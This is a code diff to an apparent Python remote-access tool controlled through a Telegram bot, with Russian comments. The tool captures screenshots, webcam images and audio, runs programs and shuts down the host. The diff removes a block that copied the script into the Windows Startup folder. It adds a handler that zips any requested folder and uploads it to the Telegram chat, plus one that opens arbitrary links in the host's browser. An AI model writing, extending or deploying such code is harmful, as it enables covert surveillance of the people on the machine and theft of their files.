@@ -13,25 +13,13 @@ import numpy as np
 import wavio
 import threading
 from functools import partial
+import psutil
+import webbrowser
+import zipfile
+import shutil
 
-# Путь к текущему каталогу, где находится скрипт
-current_directory = os.path.dirname(os.path.abspath(__file__))
 
-# Имя Python скрипта, который вы хотите добавить в автозагрузку
-script_name = "script.py"
 
-# Полный путь к Python скрипту
-script_path = os.path.join(current_directory, script_name)
-
-# Путь к каталогу автозагрузки пользователя
-startup_directory = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-
-# Проверяем, что скрипт еще не добавлен в автозагрузку
-if not os.path.isfile(os.path.join(startup_directory, script_name)):
-    # Копируем скрипт в каталог автозагрузки
-    destination = os.path.join(startup_directory, script_name)
-    subprocess.Popen(['copy', script_path, destination], shell=True)
-    print(f"Скрипт {script_name} добавлен в автозагрузку.")
 
 # Замените 'YOUR_BOT_TOKEN' на токен вашего Telegram бота
 bot = telebot.TeleBot('YOUR_BOT_TOKEN')
@@ -89,17 +77,63 @@ def start(message):
         webcam_button = telebot.types.KeyboardButton("Вебка")
         media_button = telebot.types.KeyboardButton("Открыть фото/видео")
         audio_button = telebot.types.KeyboardButton("Запись аудио")
-        run_program_button = telebot.types.KeyboardButton("Запустить программу")  # Добавляем кнопку для запуска программы
+        run_program_button = telebot.types.KeyboardButton("Запустить программу") 
+        open_link_button = telebot.types.KeyboardButton("Открыть ссылку")
+        save_folder_button = telebot.types.KeyboardButton("Сохранить папку")
         
         markup.row(screenshot_button, shutdown_button, info_button)
         markup.row(reboot_button, webcam_button)
-        markup.row(media_button, audio_button, run_program_button)  # Добавляем кнопку для запуска программы
+        markup.row(media_button, audio_button, run_program_button)  
+        open_link_button = telebot.types.KeyboardButton("Открыть ссылку")
+        markup.add(open_link_button)
+        save_folder_button = telebot.types.KeyboardButton("Сохранить папку")
+        markup.add(save_folder_button)
+
         
         bot.send_message(message.chat.id, "Скрипт запущен / made by @danieldrain ")
         
         bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
     else:
         bot.send_message(message.chat.id, "Вы не авторизованы для использования этого бота.")
+
+@bot.message_handler(func=lambda message: message.text == "Сохранить папку")
+def save_folder_handler(message):
+    bot.send_message(message.chat.id, "Пожалуйста, отправьте мне путь к папке, которую вы хотите сохранить в ZIP архиве.")
+    bot.send_message(message.chat.id, "Функция находится в БЕТА-Тестировании. Возможны баги.")
+
+# Обработчик текстового сообщения с путем к папке
+@bot.message_handler(func=lambda message: os.path.exists(message.text) and os.path.isdir(message.text))
+def create_zip_archive(message):
+    folder_path = message.text
+    zip_filename = 'saved_folder.zip'
+    
+    # Создаем ZIP архив
+    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, folder_path)
+                zipf.write(file_path, arcname)
+    
+    # Отправляем ZIP архив
+    with open(zip_filename, 'rb') as zip_file:
+        bot.send_document(message.chat.id, zip_file)
+    
+    # Удаляем временный ZIP файл
+    os.remove(zip_filename)
+    
+    bot.send_message(message.chat.id, "Папка успешно сохранена в ZIP архиве и отправлена вам!")
+
+@bot.message_handler(func=lambda message: message.text == "Открыть ссылку")
+def open_link_handler(message):
+    bot.send_message(message.chat.id, "Пожалуйста, отправьте мне ссылку, которую вы хотите открыть в браузере.")
+
+# Обработчик текстового сообщения с ссылкой
+@bot.message_handler(func=lambda message: message.text.startswith("http://") or message.text.startswith("https://"))
+def open_browser(message):
+    url = message.text
+    webbrowser.open(url)
+    bot.send_message(message.chat.id, f"Ссылка {url} успешно открыта в браузере!")
 
 # Функция для запуска программы
 def run_program(message, program_path):
@@ -145,6 +179,10 @@ def get_system_info(message):
     ip_address = socket.gethostbyname(hostname)
     os_info = platform.platform()
     
+    # Получаем информацию о загрузке CPU и использовании памяти
+    cpu_percent = psutil.cpu_percent(interval=1)
+    memory_info = psutil.virtual_memory()
+    
     disk_info = []
     for part in psutil.disk_partitions():
         try:
@@ -153,7 +191,11 @@ def get_system_info(message):
         except PermissionError:
             disk_info.append(f"{part.device}: Недоступен")
     
-    info_message = "Имя хоста: {}\nIP-адрес: {}\nОС: {}\nДиски:\n{}".format(hostname, ip_address, os_info, '\n'.join(disk_info))
+    info_message = "Имя хоста: {}\nIP-адрес: {}\nОС: {}\n".format(hostname, ip_address, os_info)
+    info_message += "Использование CPU: {}%\n".format(cpu_percent)
+    info_message += "Использование памяти: {}%\n".format(memory_info.percent)
+    info_message += "Диски:\n{}".format('\n'.join(disk_info))
+    
     bot.send_message(message.chat.id, info_message)
 
 @bot.message_handler(func=lambda message: message.text == "Вебка")
@@ -237,6 +279,8 @@ def handle_video(message):
         waiting_for_media = False
     else:
         bot.send_message(message.chat.id, "Не ожидал фото или видео.")
+
+
 
 @bot.message_handler(func=lambda message: True)
 def handle_other_messages(message):
